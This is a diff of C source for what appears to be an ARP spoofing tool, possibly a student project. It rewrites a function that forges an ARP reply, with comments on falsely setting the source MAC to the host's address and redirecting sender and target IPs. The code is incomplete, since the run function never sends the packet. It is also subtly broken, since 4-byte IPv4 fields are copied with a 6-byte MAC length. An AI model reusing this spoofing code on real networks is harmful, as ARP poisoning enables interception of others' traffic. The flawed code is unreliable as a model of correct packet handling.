@@ -20,24 +20,35 @@ ARP Header
 Payload (if any)
 */
 
-/* Define the structure of the packet according to the RFC 826 specification
- We will use this structure to imitate an authentic packet
- so that the reply to the ARP request will be accepted by the network
-*/
-unsigned char	*_mc_create_packet_for_spoofing(void)
+_mc_t_packet    _mc_create_packet_for_spoofing(void)
 {
     // Create the ARP reply packet
-    unsigned char       packet[sizeof(struct ethhdr) + sizeof(struct ether_arp)];
-    struct ethhdr       *eth_header = (struct ethhdr*)packet;
-    struct ether_arp    *arp_header = (struct ether_arp*)(packet + sizeof(struct ethhdr));
+    _mc_t_packet        packet = {0};
+    packet.ethernet_header = *_mc_g_data.ethernet_header;
+    packet.arp_packet = *_mc_g_data.arp_packet;
 
-	_mc_memcpy(eth_header->h_dest, _mc_g_data.ethernet_header->h_source, ETH_ALEN);
-	_mc_memcpy(eth_header->h_source, _mc_g_data.ethernet_header->h_source, ETH_ALEN);
+    /* Spoofing the ethernet header */
 
-	eth_header->h_proto = htons(ETH_P_ARP);
+    // The destination MAC is set to the target's MAC address
+	_mc_memcpy(packet.ethernet_header.h_dest, _mc_g_data.ethernet_header->h_source, ETH_ALEN);
+    // The source MAC is falsly set to the host's MAC address
+	_mc_memcpy(packet.ethernet_header.h_source, _mc_g_data.host_mac, ETH_ALEN);
+
+    /* Spoofing the arp packet */
+
+    // The target MAC is replaced by the ARP request's MAC address
+	_mc_memcpy(packet.arp_packet.arp_tha, packet.arp_packet.arp_sha, ETH_ALEN);
+    // Again, the source MAC is falsly set to the host's MAC address
+	_mc_memcpy(packet.arp_packet.arp_sha, _mc_g_data.host_mac, ETH_ALEN);
+    // The sender's IP is falsly set to the former target IP address of the ARP request
+	_mc_memcpy(packet.arp_packet.arp_spa, packet.arp_packet.arp_tpa, ETH_ALEN);
+    // The target's IP is the one given from the command line
+	_mc_memcpy(packet.arp_packet.arp_tpa, _mc_g_data.target_ip, ETH_ALEN);
+
+    return packet;
 }
 
 void	_mc_run_arp_spoofing(void)
 {
-	unsigned char	packet = _mc_create_packet_for_spoofing();
+	_mc_t_packet	packet = _mc_create_packet_for_spoofing();
 }
